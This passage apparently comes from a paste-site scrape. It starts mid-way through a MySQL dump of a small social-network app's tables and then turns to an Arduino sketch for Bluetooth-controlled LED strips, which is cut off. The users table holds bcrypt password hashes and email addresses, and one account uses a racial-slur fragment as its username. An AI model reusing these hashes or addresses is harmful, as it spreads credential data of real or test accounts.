) ENGINE=InnoDB DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `likes`
--

LOCK TABLES `likes` WRITE;
/*!40000 ALTER TABLE `likes` DISABLE KEYS */;
INSERT INTO `likes` VALUES ('b93f9ba3-a511-4294-8043-83db51b0ac58',1,'67158822-4971-4358-a591-28d8cd117581','98ae659e-daed-4ce8-b565-0925e0cbb05b');
/*!40000 ALTER TABLE `likes` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `logs`
--

DROP TABLE IF EXISTS `logs`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `logs` (
  `id` varchar(255) NOT NULL,
  `action` varchar(255) DEFAULT NULL,
  `method` varchar(255) DEFAULT NULL,
  `table_name` varchar(255) DEFAULT NULL,
  `time` datetime DEFAULT NULL,
  `username` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `logs`
--

LOCK TABLES `logs` WRITE;
/*!40000 ALTER TABLE `logs` DISABLE KEYS */;
INSERT INTO `logs` VALUES ('003cc828-1131-44b8-a33a-841f5ba466e4','login','POST','-','2023-12-13 11:02:19','nigg'),('0413a29b-c2b8-4c65-8e98-9337ac9fa11d','register','POST','users','2023-12-09 12:14:42','pesho 0'),('08e8b378-1294-43a5-916e-e04501a78d5e','register','POST','users','2023-11-30 17:56:06','pesho 0'),('094c3aa9-e5ff-4056-b2f0-5bbb4ff04f30','register','POST','users','2023-12-08 16:51:59','pesho 0'),('09f85625-aba3-4dfd-a690-07456e4fff8a','register','POST','users','2023-12-07 14:34:43','pesho 0'),('0c427422-f998-4f8d-ba8a-9bc5a07fef16','register','POST','users','2023-12-09 12:14:42','pesho 0'),('0c976bad-8829-49cb-86e9-b210c90a93d4','register','POST','users','2023-12-09 09:16:12','pesho 0'),('0ceb8c40-673d-47ae-b259-04192d40d75f','login','POST','-','2023-12-10 12:20:35','arbuz'),('0e3a3fe4-59cb-4357-be2a-223916a9759d','login','POST','-','2023-12-11 18:14:46','arbuz'),('10bdb5d9-32ff-4760-bdb3-ac205453b1de','register','POST','users','2023-12-13 11:01:30','nigg'),('1159092b-3400-4607-8460-c9f8c55e4fc7','register','POST','users','2023-12-09 15:39:50','pesho 0'),('15160fe8-d1d8-462a-9438-00a7222eca76','addFriend','POST','relationship','2023-12-10 08:22:19','arbuz'),('1971f7bb-71b5-4e88-b822-884f7a1e0d14','login','POST','-','2023-12-10 08:04:26','admin'),('19a5fa19-f4fc-4fae-a0a6-b396f5dff3fe','login','POST','-','2023-12-13 11:01:59','arbuz'),('1bbf9e98-7599-4a7e-b5b1-db6e3541ac6f','register','POST','users','2023-11-30 18:01:51','pesho 0'),('1cf062d8-5ced-4c69-8fc5-52b2fbcfb5e4','register','POST','users','2023-11-30 17:53:34','pesho 0'),('1fcecdbd-d33a-478f-bbbd-82a5376e009c','create','POST','comment','2023-12-11 18:20:03','arbuz'),('21c645b7-d99c-4e7a-b318-6b1865ecb4ed','login','POST','-','2023-12-10 12:15:07','arbuz'),('28fb5e7f-c09f-42e8-8142-8aa6d35ebce5','addFriend','POST','relationship','2023-12-11 18:16:20','user'),('2b1499f4-a522-4e45-b6c1-85cd3379ac0d','login','POST','-','2023-12-10 08:21:43','arbuz'),('3129b3c6-3ea1-4507-aab9-f6bfc6d212f7','login','POST','-','2023-12-11 18:17:51','user'),('3601ac70-eda9-4425-84b9-a92b976e1d82','login','POST','-','2023-12-11 18:19:27','arbuz'),('361a2288-adc9-43a9-ae78-a9cbc92c6f16','acceptFriend','POST','relationship','2023-12-11 18:17:09','arbuz'),('403725b4-11a5-485a-a3d6-df272fa388ad','register','POST','users','2023-12-08 16:39:55','pesho 0'),('42f68ea4-39c6-4a48-95ba-cb16df675958','add','POST','like','2023-12-11 18:20:13','arbuz'),('4cade951-fc04-4229-935f-3b78311d6352','register','POST','users','2023-11-26 21:08:05','admin'),('4cd8b597-fdab-48e4-8ce9-3781c2a404a5','register','POST','users','2023-12-09 12:35:35','pesho 0'),('4ec4707b-9291-4f49-a288-5b9c6166edee','register','POST','users','2023-12-09 09:12:51','pesho 0'),('5614d990-4e96-4d51-bb5e-9388203eae51','register','POST','users','2023-12-09 12:29:34','pesho 0'),('5c40f8aa-0122-4b1d-bfed-5434ba0ec9b2','register','POST','users','2023-12-10 08:21:34','arbuz'),('5e058b11-4fc4-43ed-9d41-8d082984595b','register','POST','users','2023-11-30 18:14:38','pesho 0'),('632fe63f-c2c3-45b7-924b-7a95471f1363','register','POST','users','2023-12-08 17:09:00','pesho 0'),('63ac4615-eaf9-48bf-929c-441b4be699fc','register','POST','users','2023-12-09 09:12:52','pesho 0'),('697145d1-7e8f-4a1f-9027-7a64936c3016','addFriend','POST','relationship','2023-12-13 11:01:45','nigg'),('6af4c712-752e-4850-9797-5ed6b98343d2','register','POST','users','2023-12-08 16:39:56','pesho 0'),('6de28e66-dc9f-4fe3-9d6d-c5367bd2dd21','acceptFriend','POST','relationship','2023-12-13 11:02:05','arbuz'),('71aa9fe7-0189-4ba1-9b3c-b483428eb65b','register','POST','users','2023-12-09 12:20:39','pesho 0'),('7302ff17-a86c-4ca5-950c-fc7cde49a899','register','POST','users','2023-12-08 16:51:04','pesho 0'),('736272b2-dd2b-438a-ab42-d853433d3a2c','register','POST','users','2023-11-30 18:06:57','pesho 0'),('7cd078dd-b763-41d5-ac78-6adfb0fbeeca','register','POST','users','2023-11-30 18:14:38','pesho 0'),('7d0aa871-2618-46c7-a020-fc6cf1ed403d','create','POST','post','2023-12-11 18:19:04','user'),('835c4fc0-3f22-4078-aeba-eecca6c2d661','register','POST','users','2023-12-09 15:39:49','pesho 0'),('8a9d3e51-5d21-4a58-bbb0-9c91d7243c2e','register','POST','users','2023-12-08 16:51:59','pesho 0'),('8e1e58a1-bb5f-4ee8-a46c-391a138d2a50','register','POST','users','2023-11-30 17:56:06','pesho 0'),('92b35dac-8f3a-439e-bab8-2271b6922329','register','POST','users','2023-12-09 12:20:39','pesho 0'),('94e90f00-514e-4365-a369-956f6236eeb1','register','POST','users','2023-12-11 18:16:05','user'),('a4036460-8441-4a7d-9ec8-158354ce9c96','login','POST','-','2023-12-11 18:16:12','user'),('a493dae4-875f-45fa-a7af-1fe47a18dbbc','register','POST','users','2023-11-30 17:53:34','pesho 0'),('aced71b0-5d02-479d-90f1-119fd70afa51','register','POST','users','2023-11-30 18:06:57','pesho 0'),('af0f8fe6-50ed-4ff2-90c9-06fc597b7d04','login','POST','-','2023-12-10 12:20:17','admin'),('b00524b5-fa12-4f17-a50b-bd32287c03da','login','POST','-','2023-11-26 21:42:55','admin'),('bf9b035f-4250-466e-a061-bb84362f8e3f','login','POST','-','2023-12-11 18:16:37','arbuz'),('c2eb9d19-2606-4a3f-a2cb-fa5d03e26411','login','POST','-','2023-12-13 11:01:36','nigg'),('c346c2f3-f54d-4fbd-9c29-08eef3488647','addFriend','POST','relationship','2023-12-11 18:16:23','user'),('c3944391-e482-429b-8eab-b967dfbdcccb','register','POST','users','2023-11-30 18:16:56','pesho 0'),('c4193fef-783f-470a-b6f1-74b23effc355','login','POST','-','2023-11-26 21:35:35','admin'),('c48b64f6-5858-4712-b01f-ffd19d067c0e','register','POST','users','2023-12-09 12:35:35','pesho 0'),('c69186b2-7610-4ca6-8932-4a98693a0cf1','register','POST','users','2023-11-30 18:01:51','pesho 0'),('ccf5c3eb-fde8-40ea-b4e2-651353274b20','register','POST','users','2023-12-08 17:09:00','pesho 0'),('d0410824-d0ac-4582-ad70-67691e875b98','register','POST','users','2023-12-09 12:06:33','pesho 0'),('d0a552bf-8311-4eff-a816-34e7044e5e3d','register','POST','users','2023-12-07 14:34:43','pesho 0'),('d844ea27-c85a-4a1b-821d-0d476afa1718','register','POST','users','2023-12-08 16:51:04','pesho 0'),('e2a8fae3-3113-4bb3-95e7-b5599586a5c7','register','POST','users','2023-12-09 12:06:33','pesho 0'),('e42e9fba-f10c-464a-ac5a-5e7d00896334','acceptFriend','POST','relationship','2023-12-10 12:20:24','admin'),('eb59e8d6-b3b9-4efc-874e-3774a11237cf','register','POST','users','2023-12-09 15:35:29','pesho 0'),('ed18be7a-250e-49f3-a531-9bf58be3205c','register','POST','users','2023-11-30 18:16:57','pesho 0'),('f4646ed5-8039-4bbd-a178-f4f3324dce77','register','POST','users','2023-12-09 12:29:35','pesho 0'),('f6da1415-621c-426e-87df-6fff44cbbfc4','register','POST','users','2023-12-09 09:16:13','pesho 0'),('f7250152-9afd-48cf-b345-b7258368c52c','login','POST','-','2023-12-10 12:20:06','arbuz'),('f943e2a2-2f88-4c1c-b484-fed65277483f','register','POST','users','2023-12-09 15:35:29','pesho 0'),('fdf3360c-b535-4f61-99ea-1e93d29bc294','addFriend','POST','relationship','2023-12-13 11:01:46','nigg');
/*!40000 ALTER TABLE `logs` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `messages`
--

DROP TABLE IF EXISTS `messages`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `messages` (
  `id` varchar(255) NOT NULL,
  `content` text NOT NULL,
  `status` tinyint(4) DEFAULT '0',
  `subject` varchar(255) DEFAULT NULL,
  `time` datetime NOT NULL,
  `from_user_id` varchar(255) NOT NULL,
  `relationship_id` varchar(255) NOT NULL,
  `to_user_id` varchar(255) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `FKms9o5dx3lfmikr6k8kyxi030e` (`from_user_id`),
  KEY `FKi44ugcwnisxccf6b3vwvpafrh` (`relationship_id`),
  KEY `FK6y0sbofpv484p7yi78nr9hii1` (`to_user_id`),
  CONSTRAINT `FK6y0sbofpv484p7yi78nr9hii1` FOREIGN KEY (`to_user_id`) REFERENCES `users` (`id`),
  CONSTRAINT `FKi44ugcwnisxccf6b3vwvpafrh` FOREIGN KEY (`relationship_id`) REFERENCES `relationship` (`id`),
  CONSTRAINT `FKms9o5dx3lfmikr6k8kyxi030e` FOREIGN KEY (`from_user_id`) REFERENCES `users` (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `messages`
--

LOCK TABLES `messages` WRITE;
/*!40000 ALTER TABLE `messages` DISABLE KEYS */;
INSERT INTO `messages` VALUES ('03ffa713-4b74-48fe-b098-74e6665ceb2d','Hi',0,NULL,'2023-12-11 18:18:01','1477bbd0-f6fe-40ff-98c6-f844f21a3f44','a787a605-e616-48af-80b2-4f91fef7678a','98ae659e-daed-4ce8-b565-0925e0cbb05b'),('0d10cf6a-f82d-44b1-83b3-9039ac2760d2','Hello',1,NULL,'2023-12-13 11:02:14','98ae659e-daed-4ce8-b565-0925e0cbb05b','f8da8f8c-2537-4872-ae1b-2d849355fdd7','efc483af-61f7-4879-999e-eb4695a58554'),('1a45ebf8-9ba2-428a-8774-27f849d0fdcd','hi',0,NULL,'2023-12-13 11:02:28','efc483af-61f7-4879-999e-eb4695a58554','f8da8f8c-2537-4872-ae1b-2d849355fdd7','98ae659e-daed-4ce8-b565-0925e0cbb05b'),('23a47eac-765b-4042-9513-03ecbf528e21','Hi',1,NULL,'2023-12-11 18:17:35','98ae659e-daed-4ce8-b565-0925e0cbb05b','a787a605-e616-48af-80b2-4f91fef7678a','1477bbd0-f6fe-40ff-98c6-f844f21a3f44');
/*!40000 ALTER TABLE `messages` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `pictures`
--

DROP TABLE IF EXISTS `pictures`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `pictures` (
  `id` varchar(255) NOT NULL,
  `cloudinary_public_id` varchar(255) DEFAULT NULL,
  `description` varchar(255) DEFAULT NULL,
  `image_url` varchar(255) NOT NULL,
  `time` datetime NOT NULL,
  `user_id` varchar(255) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `FK5s53tythj7c44tr5tejj42kv` (`user_id`),
  CONSTRAINT `FK5s53tythj7c44tr5tejj42kv` FOREIGN KEY (`user_id`) REFERENCES `users` (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `pictures`
--

LOCK TABLES `pictures` WRITE;
/*!40000 ALTER TABLE `pictures` DISABLE KEYS */;
/*!40000 ALTER TABLE `pictures` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `posts`
--

DROP TABLE IF EXISTS `posts`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `posts` (
  `id` varchar(255) NOT NULL,
  `content` text NOT NULL,
  `image_url` varchar(255) DEFAULT NULL,
  `time` datetime NOT NULL,
  `user_id` varchar(255) NOT NULL,
  `timeline_user_id` varchar(255) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `FK5lidm6cqbc7u4xhqpxm898qme` (`user_id`),
  KEY `FKklu6thpiw3x0lhs2aqkp2kpaj` (`timeline_user_id`),
  CONSTRAINT `FK5lidm6cqbc7u4xhqpxm898qme` FOREIGN KEY (`user_id`) REFERENCES `users` (`id`),
  CONSTRAINT `FKklu6thpiw3x0lhs2aqkp2kpaj` FOREIGN KEY (`timeline_user_id`) REFERENCES `users` (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `posts`
--

LOCK TABLES `posts` WRITE;
/*!40000 ALTER TABLE `posts` DISABLE KEYS */;
INSERT INTO `posts` VALUES ('67158822-4971-4358-a591-28d8cd117581','I visit Rome',NULL,'2023-12-11 18:19:04','1477bbd0-f6fe-40ff-98c6-f844f21a3f44','1477bbd0-f6fe-40ff-98c6-f844f21a3f44');
/*!40000 ALTER TABLE `posts` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `relationship`
--

DROP TABLE IF EXISTS `relationship`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `relationship` (
  `id` varchar(255) NOT NULL,
  `status` tinyint(4) NOT NULL DEFAULT '0',
  `time` datetime NOT NULL,
  `action_user_id` varchar(255) NOT NULL,
  `user_one_id` varchar(255) NOT NULL,
  `user_two_id` varchar(255) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `FKiohx951gy5ym172v8oynvssoo` (`action_user_id`),
  KEY `FKgnhhaxwlbj57j006uke06ywfu` (`user_one_id`),
  KEY `FKe4inve33uxp6pgcbo3d1lismg` (`user_two_id`),
  CONSTRAINT `FKe4inve33uxp6pgcbo3d1lismg` FOREIGN KEY (`user_two_id`) REFERENCES `users` (`id`),
  CONSTRAINT `FKgnhhaxwlbj57j006uke06ywfu` FOREIGN KEY (`user_one_id`) REFERENCES `users` (`id`),
  CONSTRAINT `FKiohx951gy5ym172v8oynvssoo` FOREIGN KEY (`action_user_id`) REFERENCES `users` (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `relationship`
--

LOCK TABLES `relationship` WRITE;
/*!40000 ALTER TABLE `relationship` DISABLE KEYS */;
INSERT INTO `relationship` VALUES ('6c1281a8-8a21-4af7-943e-df62f971cf2a',0,'2023-12-13 11:01:46','efc483af-61f7-4879-999e-eb4695a58554','efc483af-61f7-4879-999e-eb4695a58554','1477bbd0-f6fe-40ff-98c6-f844f21a3f44'),('80a3537e-21c2-489a-9b20-f92969b0a00c',1,'2023-12-10 12:20:24','e2ad9af1-e2c6-46b4-9e3c-f7211c77063e','98ae659e-daed-4ce8-b565-0925e0cbb05b','e2ad9af1-e2c6-46b4-9e3c-f7211c77063e'),('a787a605-e616-48af-80b2-4f91fef7678a',1,'2023-12-11 18:17:09','98ae659e-daed-4ce8-b565-0925e0cbb05b','1477bbd0-f6fe-40ff-98c6-f844f21a3f44','98ae659e-daed-4ce8-b565-0925e0cbb05b'),('e4258f15-fa30-4517-8b66-e45bce7f502b',0,'2023-12-11 18:16:23','1477bbd0-f6fe-40ff-98c6-f844f21a3f44','1477bbd0-f6fe-40ff-98c6-f844f21a3f44','e2ad9af1-e2c6-46b4-9e3c-f7211c77063e'),('f8da8f8c-2537-4872-ae1b-2d849355fdd7',1,'2023-12-13 11:02:05','98ae659e-daed-4ce8-b565-0925e0cbb05b','efc483af-61f7-4879-999e-eb4695a58554','98ae659e-daed-4ce8-b565-0925e0cbb05b');
/*!40000 ALTER TABLE `relationship` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `roles`
--

DROP TABLE IF EXISTS `roles`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `roles` (
  `id` varchar(255) NOT NULL,
  `authority` varchar(255) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `roles`
--

LOCK TABLES `roles` WRITE;
/*!40000 ALTER TABLE `roles` DISABLE KEYS */;
INSERT INTO `roles` VALUES ('35541136-aaa7-4976-94ab-19a768b80427','USER'),('37ecf161-9377-4d39-a16e-ac5e1b1a9983','ROOT'),('fdb614ce-eacd-449a-ad74-884fdb04b0dc','ADMIN');
/*!40000 ALTER TABLE `roles` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `users`
--

DROP TABLE IF EXISTS `users`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `users` (
  `id` varchar(255) NOT NULL,
  `is_account_non_expired` tinyint(1) NOT NULL DEFAULT '1',
  `is_account_non_locked` tinyint(1) NOT NULL DEFAULT '1',
  `address` varchar(255) NOT NULL,
  `background_image_url` text,
  `city` varchar(255) NOT NULL,
  `is_credentials_non_expired` tinyint(1) NOT NULL DEFAULT '1',
  `is_deleted` tinyint(1) NOT NULL DEFAULT '0',
  `email` varchar(50) CHARACTER SET latin1 COLLATE latin1_bin NOT NULL,
  `is_enabled` tinyint(1) NOT NULL DEFAULT '1',
  `first_name` varchar(255) NOT NULL,
  `last_name` varchar(255) NOT NULL,
  `is_online` tinyint(1) NOT NULL DEFAULT '0',
  `password` varchar(255) NOT NULL,
  `profile_pic_url` text,
  `username` varchar(50) CHARACTER SET latin1 COLLATE latin1_bin NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `UK_6dotkott2kjsp8vw4d0m25fb7` (`email`),
  UNIQUE KEY `UK_r43af9ap4edm43mmtq01oddj6` (`username`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `users`
--

LOCK TABLES `users` WRITE;
/*!40000 ALTER TABLE `users` DISABLE KEYS */;
INSERT INTO `users` VALUES ('1477bbd0-f6fe-40ff-98c6-f844f21a3f44',1,1,'user','/static/media/default-background-image.c1edb894.jpg','User',1,0,'user@gmail.com',1,'User','User',0,'$2a$10$Jv54LR4zTEZVWJJH.5KX6ePOzwuPFOPam3h6JP7qNnC9eyKlCsA6a','/static/media/placeholder.91347baa.png','user'),('98ae659e-daed-4ce8-b565-0925e0cbb05b',1,1,'arbuz','/static/media/default-background-image.c1edb894.jpg','Arbuz',1,0,'arbuz@gmail.com',1,'Arbuz','Arbuz',0,'$2a$10$wq6VwtqOgpikU2EJmuKMVuHOVSReG94i3ZVRPL9JNZV2u1h/yRL5K','/static/media/placeholder.91347baa.png','arbuz'),('e2ad9af1-e2c6-46b4-9e3c-f7211c77063e',1,1,'Minsk','aiusodhfiu234','Minsk',1,0,'admin@gmail.com',1,'Admin','Admin',0,'$2a$10$zQbiLBLjA2fkAV/6G7jUJewH79Vn8shInGaq36dCQTIyrmAJQTroW','asdfihuib','admin'),('efc483af-61f7-4879-999e-eb4695a58554',1,1,'nig','/static/media/default-background-image.c1edb894.jpg','nig',1,0,'nig@gmail.com',1,'Nig','Nig',0,'$2a$10$HCRIThlxqWUfDKUZUKrqEOgd7hRrrvxcGORK2CBNYDnqTgJk8.Ceu','/static/media/placeholder.91347baa.png','nigg');
/*!40000 ALTER TABLE `users` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `users_roles`
--

DROP TABLE IF EXISTS `users_roles`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `users_roles` (
  `user_id` varchar(255) NOT NULL,
  `role_id` varchar(255) NOT NULL,
  PRIMARY KEY (`user_id`,`role_id`),
  KEY `FKj6m8fwv7oqv74fcehir1a9ffy` (`role_id`),
  CONSTRAINT `FK2o0jvgh89lemvvo17cbqvdxaa` FOREIGN KEY (`user_id`) REFERENCES `users` (`id`),
  CONSTRAINT `FKj6m8fwv7oqv74fcehir1a9ffy` FOREIGN KEY (`role_id`) REFERENCES `roles` (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `users_roles`
--

LOCK TABLES `users_roles` WRITE;
/*!40000 ALTER TABLE `users_roles` DISABLE KEYS */;
INSERT INTO `users_roles` VALUES ('1477bbd0-f6fe-40ff-98c6-f844f21a3f44','35541136-aaa7-4976-94ab-19a768b80427'),('98ae659e-daed-4ce8-b565-0925e0cbb05b','35541136-aaa7-4976-94ab-19a768b80427'),('efc483af-61f7-4879-999e-eb4695a58554','35541136-aaa7-4976-94ab-19a768b80427'),('e2ad9af1-e2c6-46b4-9e3c-f7211c77063e','37ecf161-9377-4d39-a16e-ac5e1b1a9983');
/*!40000 ALTER TABLE `users_roles` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2023-12-20  1:05:38
"
5VQqdWa5,RemoteLEDStripControl8StripRev0,JonD1988,Arduino,Tuesday 19th of December 2023 04:18:20 PM CDT,"//Rev 0 Developed on 12/19/2023 by Jonathan DeWitt.  This is almost a direct copy of ""RemoteLEDStripControlRev1.ino"" except it controls 8 strips instead of 1 strip.
#include ""BluetoothSerial.h"" //Needed to communicate via Bluetooth
#include <FastLED.h> //Needed to control LED Strip - In this case WS2812B

//Next 3 lines needed for Bluetooth communication
#if !defined(CONFIG_BT_ENABLED) || !defined(CONFIG_BLUEDROID_ENABLED)
#error Bluetooth is not enabled! Please run `make menuconfig` to and enable it
#endif

FASTLED_USING_NAMESPACE //From DemoReel100Rev4.ino Used for LED Strip Control
#define LED_TYPE    WS2812B
#define COLOR_ORDER GRB //From DemoReel100Rev4.ino Used for LED Strip Control
#define NUM_LEDS    10 //From DemoReel100Rev4.ino Used for LED Strip Control
//#define NUM_LEDS2 19 //Center strip or strip 2 has 19 LEDs
//CRGB leds[NUM_LEDS]; //From DemoReel100Rev4.ino Used for LED Strip Control
CRGB leds1[NUM_LEDS];
CRGB leds2[NUM_LEDS];
CRGB leds3[NUM_LEDS];
CRGB leds4[NUM_LEDS];
CRGB leds5[NUM_LEDS];
CRGB leds6[NUM_LEDS];
CRGB leds7[NUM_LEDS];
CRGB leds8[NUM_LEDS];
//#define BRIGHTNESS          96 //From DemoReel100Rev4.ino Used for LED Strip Control
int BRIGHTNESS = 96;
#define FRAMES_PER_SECOND  120 //From DemoReel100Rev4.ino Used for LED Strip Control

#define DATA_PIN1    13
#define DATA_PIN2    27
#define DATA_PIN3    26
#define DATA_PIN4    25
#define DATA_PIN5    33
#define DATA_PIN6    32
#define DATA_PIN7    23
#define DATA_PIN8    22

BluetoothSerial SerialBT; //Creates an object called SerialBT to use in Bluetooth Communication
char incomingSig; //Stores what character is read from the bluetooth module
int PosGI, PosgI, LastDigit,BRIGHTNESStest, BrightResults;

void setup() {
  Serial.begin(115200); //Starts the serial communication setting the baud rate
  SerialBT.begin(""DennisDesktopLampController""); //Bluetooth device name
  Serial.println(""The device started, now you can pair it with bluetooth!"");
  //FastLED.addLeds<LED_TYPE,LEDstrip1,COLOR_ORDER>(leds, NUM_LEDS).setCorrection(TypicalLEDStrip); //Tell FastLED about the LED strip configuration - For LED Strip Control
  FastLED.addLeds<LED_TYPE,DATA_PIN1,COLOR_ORDER>(leds1, NUM_LEDS).setCorrection(TypicalLEDStrip);
  FastLED.addLeds<LED_TYPE,DATA_PIN2,COLOR_ORDER>(leds2, NUM_LEDS).setCorrection(TypicalLEDStrip);
  FastLED.addLeds<LED_TYPE,DATA_PIN3,COLOR_ORDER>(leds3, NUM_LEDS).setCorrection(TypicalLEDStrip);
  FastLED.addLeds<LED_TYPE,DATA_PIN4,COLOR_ORDER>(leds4, NUM_LEDS).setCorrection(TypicalLEDStrip);
  FastLED.addLeds<LED_TYPE,DATA_PIN5,COLOR_ORDER>(leds5, NUM_LEDS).setCorrection(TypicalLEDStrip);
  FastLED.addLeds<LED_TYPE,DATA_PIN6,COLOR_ORDER>(leds6, NUM_LEDS).setCorrection(TypicalLEDStrip);
  FastLED.addLeds<LED_TYPE,DATA_PIN7,COLOR_ORDER>(leds7, NUM_LEDS).setCorrection(TypicalLEDStrip);
  FastLED.addLeds<LED_TYPE,DATA_PIN8,COLOR_ORDER>(leds8, NUM_LEDS).setCorrection(TypicalLEDStrip);
  
  FastLED.setBrightness(BRIGHTNESS); //Set master brightness control for LED strip
  BRIGHTNESStest=BRIGHTNESS; //Initialize BRIGHTNESStest to the same value as BRIGHTNESS so that BRIGHTNESStest is never 0
  BrightResults=BRIGHTNESS;
} //End of void setup

// List of patterns to cycle through.  Each is defined as a separate function below.
typedef void (*SimplePatternList[])();
SimplePatternList gPatterns = {rainbow, rainbowWithGlitter, confetti, allBlue, juggle, allWhite};
uint8_t gCurrentPatternNumber = 0; // Index number of which pattern is current
uint8_t gHue = 0; //Rotating ""base color"" used by many of the patterns for LED Strip Control

void loop() {
  if (SerialBT.available()) { //Reads from the ESP32 bluetooth receiving from the paired device
    incomingSig=SerialBT.read(); //Reads from the ESP32 Bluetooth and stores it to the incoming Sig variable
    Serial.println(incomingSig); //Prints to the Serial Monitor the contents of the incomingSig variable
  }//End of if (SerialBT.available()) statement

  //Start the section of code which actually writes to the LED strip
  gPatterns[gCurrentPatternNumber](); //Call the current pattern function once, updating the 'leds' array
  
  FastLED.show();  //Send the 'leds' array out to the actual LED strip - Turns strip on
  
  FastLED.delay(1000/FRAMES_PER_SECOND); //Insert a delay to keep the framerate modest for LED strip
  //Do some periodic updates
  EVERY_N_MILLISECONDS( 20 ) { gHue++; } //Slowly cycle the ""base color"" through the rainbow
  //End the section of code which actually writes to the LED strip

    switch(incomingSig)  //Reads the incoming blutetooth serial connection and decides what to do with it
    {
      case 'A':
        gCurrentPatternNumber = 0; //Accesses the 1st element (index 0) of the array i.e. rainbow
        break;
      case 'C':
        gCurrentPatternNumber = 1; //Accesses the 2nd element (index 1) of the array i.e. rainbowWithGlitter
        break;
      case 'E':
        gCurrentPatternNumber = 2; //Accesses the 3rd element (index 2) of the array i.e. confetti
        break;
      case 'I':
        gCurrentPatternNumber = 3; //Accesses the 4th element (index 3) of the array i.e. allBlue
        break;
      case 'K':
        gCurrentPatternNumber = 4; //Accesses the 5th element (index 4) of the array i.e. juggle
        break;
      case 'M':
        gCurrentPatternNumber = 5; //Accesses the 6th element (index 6) of the array i.e. allWhite
        break;
      case 'G':
        BrightResults = readBrightness(); //calls the readBrightness function which extracts the new brightness level the user desires
        break;
    }//End of switch statement

  delay(20); //Delay between readings from Bluetooth

  if(BrightResults>0) //If brightvalue is non-zero then it updates the brightness
  {
      FastLED.setBrightness(BrightResults); //Set master brightness control for LED strip
  } //End of BrightResults non-zero test if statement
  
}//End of void loop()

//Function definitions
#define ARRAY_SIZE(A) (sizeof(A) / sizeof((A)[0]))

void nextPattern()
{
  // add one to the current pattern number, and wrap around at the end
  gCurrentPatternNumber = (gCurrentPatternNumber + 1) % ARRAY_SIZE( gPatterns);
}

void rainbow() 
{
  // FastLED's built-in rainbow generator
  fill_rainbow( leds1, NUM_LEDS, gHue, 7);
  fill_rainbow( leds2, NUM_LEDS, gHue, 7);
  fill_rainbow( leds3, NUM_LEDS, gHue, 7);
  fill_rainbow( leds4, NUM_LEDS, gHue, 7);
  fill_rainbow( leds5, NUM_LEDS, gHue, 7);
  fill_rainbow( leds6, NUM_LEDS, gHue, 7);
  fill_rainbow( leds7, NUM_LEDS, gHue, 7);
  fill_rainbow( leds8, NUM_LEDS, gHue, 7);
}

void rainbowWithGlitter() 
{
  // built-in FastLED rainbow, plus some random sparkly glitter
  rainbow();
  addGlitter(80);
}

void addGlitter( fract8 chanceOfGlitter) 
{
  if( random8() < chanceOfGlitter) {
    leds1[ random16(NUM_LEDS) ] += CRGB::White;
    leds2[ random16(NUM_LEDS) ] += CRGB::White;
    leds3[ random16(NUM_LEDS) ] += CRGB::White;
